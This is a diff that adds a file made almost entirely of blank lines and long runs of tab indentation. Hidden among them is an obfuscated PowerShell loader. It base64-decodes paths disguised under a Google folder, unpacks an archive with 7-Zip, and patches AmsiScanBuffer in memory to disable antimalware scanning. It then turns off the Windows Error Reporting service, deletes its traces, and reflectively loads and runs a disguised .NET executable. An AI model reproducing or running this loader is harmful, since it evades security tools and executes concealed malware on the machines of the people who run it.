@@ -1,0 +1,339 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																																																																																																																																																																																																																																																																																																																														$KpigijqujkMwiKKvc = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QzpcUHJvZ3JhbURhdGFcR29vZ2xlXEluc3RhbGxVdGlsLmV4ZQ=="))
+																																																																																																																																																																																																																																																																																																																														$EQOdnycpSqezMLffV = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y21kLmV4ZQ=="))
+																																																																																																																																																																																																																																																																																																																														$PWchSHvfDIjiblJMP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IC9jICJDOlxQcm9ncmFtRGF0YVxHb29nbGVcN3ouZXhlIiB4IC1vQzpcUHJvZ3JhbURhdGFcR29vZ2xlXCBDOlxQcm9ncmFtRGF0YVxHb29nbGVcSW5zdGFsbFV0aWwucG5nLjAwMSAtcHggLXk="))
+																																																																																																																																																																																																																																																																																																																														if (-Not (Test-Path $KpigijqujkMwiKKvc)) {
+																																																																																																																																																																																																																																																																																																																														$VkxOXrEPPgmxodNCG = ($EQOdnycpSqezMLffV + $PWchSHvfDIjiblJMP)
+																																																																																																																																																																																																																																																																																																																														$fMAWoGHBrHRInOJbG = Start-Process $EQOdnycpSqezMLffV -ArgumentList "/c $VkxOXrEPPgmxodNCG" -Wait -NoNewWindow
+																																																																																																																																																																																																																																																																																																																														}
+																																																																																																																																																																																																																																																																																																																														$OchCdwhTAUKcQAiAq = @"
+																																																																																																																																																																																																																																																																																																																														using System;
+																																																																																																																																																																																																																																																																																																																														using System.Runtime.InteropServices;
+"@
+																																																																																																																																																																																																																																																																																																																														$dRzjAFoLxfzXoTfPG = @"
+																																																																																																																																																																																																																																																																																																																														public class ybYFLTSpxwwUAYoNY
+																																																																																																																																																																																																																																																																																																																														{
+																																																																																																																																																																																																																																																																																																																														[DllImport("kernel32")]
+																																																																																																																																																																																																																																																																																																																														public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+																																																																																																																																																																																																																																																																																																																														[DllImport("kernel32")]
+																																																																																																																																																																																																																																																																																																																														public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+																																																																																																																																																																																																																																																																																																																														[DllImport("kernel32")]
+																																																																																																																																																																																																																																																																																																																														public static extern IntPtr LoadLibrary(string name);
+																																																																																																																																																																																																																																																																																																																														public static int ETODrZMkALGsMLrnb()
+																																																																																																																																																																																																																																																																																																																														{
+																																																																																																																																																																																																																																																																																																																														IntPtr jMPFpMVCAIfLPndDz = LoadLibrary("amsi.dll");																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														IntPtr qMBFIftudHMFFLyKl = GetProcAddress(jMPFpMVCAIfLPndDz, "A+msiScanBuffer");
+																																																																																																																																																																																																																																																																																																																														UIntPtr dwSize = (UIntPtr)4;
+																																																																																																																																																																																																																																																																																																																														uint Zero = 0;
+																																																																																																																																																																																																																																																																																																																														if (!VirtualProtect(qMBFIftudHMFFLyKl, dwSize, 0x40, out Zero))
+																																																																																																																																																																																																																																																																																																																														{
+																																																																																																																																																																																																																																																																																																																														return 1;
+																																																																																																																																																																																																																																																																																																																														}
+																																																																																																																																																																																																																																																																																																																														IntPtr targetAddress = qMBFIftudHMFFLyKl + 0x001b;
+																																																																																																																																																																																																																																																																																																																														Marshal.WriteByte(targetAddress, 0x31);
+																																																																																																																																																																																																																																																																																																																														Marshal.WriteByte(targetAddress + 1, 0xff);
+																																																																																																																																																																																																																																																																																																																														Marshal.WriteByte(targetAddress + 2, 0x90);
+																																																																																																																																																																																																																																																																																																																														return 0;
+																																																																																																																																																																																																																																																																																																																														}
+																																																																																																																																																																																																																																																																																																																														}
+"@
+																																																																																																																																																																																																																																																																																																																														Add-Type -TypeDefinition ($OchCdwhTAUKcQAiAq + $dRzjAFoLxfzXoTfPG) -Language CSharp
+																																																																																																																																																																																																																																																																																																																														[ybYFLTSpxwwUAYoNY]::ETODrZMkALGsMLrnb()
+																																																																																																																																																																																																																																																																																																																														if (Test-Path $KpigijqujkMwiKKvc) {
+																																																																																																																																																																																																																																																																																																																														$bAtSavTbmGBajyWFI = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cG93ZXJzaGVsbC5leGUgU2V0LVNlcnZpY2UgV2VyU3ZjIC1TdGFydHVwVHlwZSBEaXNhYmxlZDtTdGFydC1TbGVlcCA1O3JtIA=="))
+																																																																																																																																																																																																																																																																																																																														$ScriptBlock = [ScriptBlock]::Create("$bAtSavTbmGBajyWFI$KpigijqujkMwiKKvc")
+																																																																																																																																																																																																																																																																																																																														$KpigijqujkMwiKKvc = Get-Content $KpigijqujkMwiKKvc -Raw
+																																																																																																																																																																																																																																																																																																																														$KpigijqujkMwiKKvc = "T" + "V" + "q" + $KpigijqujkMwiKKvc
+																																																																																																																																																																																																																																																																																																																														$kcekOrHJFafeNogVP = [System.Convert]::FromBase64String($KpigijqujkMwiKKvc)
+																																																																																																																																																																																																																																																																																																																														$Result = & $ScriptBlock
+																																																																																																																																																																																																																																																																																																																														[Reflection.Assembly]::Load($kcekOrHJFafeNogVP) | Out-Null
+																																																																																																																																																																																																																																																																																																																														[ogd1PHCUNG61tYiXIv.swi5DTtfwtrpKWKgBs]::R1g4440dP() | Out-Null
+																																																																																																																																																																																																																																																																																																																														}
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
+																																																																																																																																																																																																																																																																																																																														
